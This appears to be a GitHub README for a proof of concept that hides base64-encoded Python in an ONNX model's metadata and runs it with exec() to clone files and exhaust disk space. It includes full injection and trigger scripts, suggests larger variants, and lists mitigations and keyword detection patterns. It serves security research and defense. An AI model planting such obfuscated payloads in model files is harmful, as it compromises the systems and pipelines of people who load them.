# ONNX Metadata Attack Vector Analysis
Proof-of-concept ONNX exploit demonstrating how base64-obfuscated Python payloads embedded in model metadata can trigger file cloning and resource exhaustion — simulating a stealthy DDoS attack vector in ML pipelines.

# 📦 What is ONNX?
ONNX (Open Neural Network Exchange) is a widely adopted format that allows interoperability between different machine learning frameworks. ONNX models are composed of computation graphs, weights, and optional metadata fields (metadata_props), which can be used to store additional information like author, version, or tags.

However, these metadata fields are unregulated and can be misused to embed arbitrary, obfuscated Python code — turning a legitimate model into a vector for resource-based attacks.

# 🚨 Exploit Overview: Metadata-Based Payload for DDoS via File Cloning
In this proof-of-concept, a Python payload is injected into an ONNX model’s metadata_props. The payload is Base64-encoded and embedded under the "run" key.

# 💣 Behavior Upon Execution:
When executed (via exec()), the payload:

1. Creates 10 copies of the infected model using shutil.copyfile().
2. Writes files named copy_0.onnx to copy_9.onnx.
3. Repeats the I/O operation, causing disk consumption and CPU load.
4. Although harmless in appearance, when done repeatedly or at scale, this becomes a Denial of Service (DoS) vector.

# 🔬 Attack Flow
1. Payload Injection into Model
   
<pre> <code>```python # inject_payload.py import onnx from onnx import helper import base64 # Load existing ONNX model model = onnx.load("model_base.onnx") # Define raw Python payload (to create 10 copies of the model) raw_payload = ''' import shutil for i in range(10): shutil.copyfile("infected_model.onnx", f"copy_{i}.onnx") ''' # Encode payload in Base64 and inject into metadata encoded_payload = base64.b64encode(raw_payload.encode()).decode() model.metadata_props.append(helper.StringStringEntryProto(key="run", value=encoded_payload)) # Save the infected model onnx.save(model, "infected_model.onnx") print("[+] Payload injected successfully.") ```</code> </pre>

2. Payload Triggered on Load
   
<pre> <code>```python # simulate_load.py import onnx import base64 # Load the infected ONNX model model = onnx.load("infected_model.onnx") # Execute the payload from metadata for prop in model.metadata_props: if prop.key == "run": exec(base64.b64decode(prop.value)) ```</code> </pre>

# 🧪 Test Results
Upon loading:
  - Ten ONNX file clones are written to disk.
  - No warnings or alerts are triggered by onnx.load().
  - Resource usage spikes momentarily (disk I/O and CPU).
When deployed at scale (e.g., multiple users loading the model in parallel), this results in:
  - Disk exhaustion
  - Performance degradation
  - Potential system instability

<img width="626" height="396" alt="image" src="https://github.com/user-attachments/assets/21fab848-f54e-404b-babc-0585d88a4072" />


# ☠️ Real-World Impact
# 🔄 Distributed Denial of Service (DDoS)
If the model is distributed via public platforms (e.g., Hugging Face, GitHub) and integrated into automated pipelines, this small-scale clone script can amplify across many machines, leading to a distributed attack.

# 💡 Variants
1. Cloning thousands of files recursively.
2. Creating infinite loops or massive memory buffers.
3. Recursive payload execution (multi-layered propagation).

# 🛡️ Mitigation & Defense Strategies
1. ❌ Never Execute Model Metadata
Avoid exec()/eval() on metadata fields at all costs. Treat metadata as non-executable strings.

# 2. 🔍 Metadata Auditing
Implement scanners to detect:
- Suspicious keywords: exec, import, os, shutil, base64, etc.
- Base64 strings with decode patterns.
- Abnormally large metadata fields.

# 3. 🧪 Model Sandbox Execution
Use containerized environments (e.g., Docker) with strict resource limits for testing model behavior.

# 4. 🔐 Use Trusted Repositories
Only use ONNX models from official or verified sources. Treat user-uploaded models as potentially malicious.

# 5. 🧰 Secure Model Pipeline
Add:
  - Metadata sanitization tools.
  - Digital signature validation.
  - Structural validation before inference deployment.

# ⚠️ Disclaimer
This repository is intended for educational and research purposes only.
The author disclaims all liability for any misuse of the code or technique.
Do not use this method in real-world environments or production systems.






      
